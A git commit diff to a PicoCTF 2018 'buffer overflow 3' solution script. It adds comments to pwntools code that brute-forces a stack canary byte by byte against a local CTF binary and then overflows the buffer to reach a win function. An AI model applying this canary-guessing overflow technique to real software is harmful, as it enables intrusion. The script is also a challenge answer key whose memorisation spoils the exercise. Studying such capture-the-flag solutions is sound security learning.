1049f4c51b91f87f6a8dc5b21ddc4b5c5a33529e
boogas0 <51495669+boogas0@users.noreply.github.com>
2020-07-09 12:20:55 -0500

    Update buff3_solution.py

--- PicoCTF2018_bufferOverflow3/buff3_solution.py
+++ PicoCTF2018_bufferOverflow3/buff3_solution.py
@@ -6,11 +6,12 @@ import pwn
 canarybytes = []
 win = 0x080486eb #address of win
 
+#find canary value
 for i in range(4):
     for guess in range(256):
         t = pwn.process("./vuln")
         t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
-        size = 32+1+i
+        size = 32+1+i   # 33, 34, 35, 36 increases size by 1 each time a byte of the canary is guessed correctly
         t.sendline(str(size))
         t.recvuntil(b'Input> ')
         buf = 'h'*32
@@ -19,15 +20,16 @@ for i in range(4):
         t.sendline(buf+chr(guess))
         if("Ok... Now Where's the Flag?\n" in t.recv()):
             canarybytes.append(guess)
-            #print guess
+            #print guess #debug statement
             t.close()
             break
         t.close()
 
-#print canarybytes
+#print canarybytes #debug statment
 
+#typical buffer overflow now that we know the canary value
 t = pwn.process("./vuln")
-#pwn.gdb.attach(t)
+#pwn.gdb.attach(t) #useful if debugging on your own system.
 t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
 t.sendline("56")
 t.recvuntil(b'Input> ')
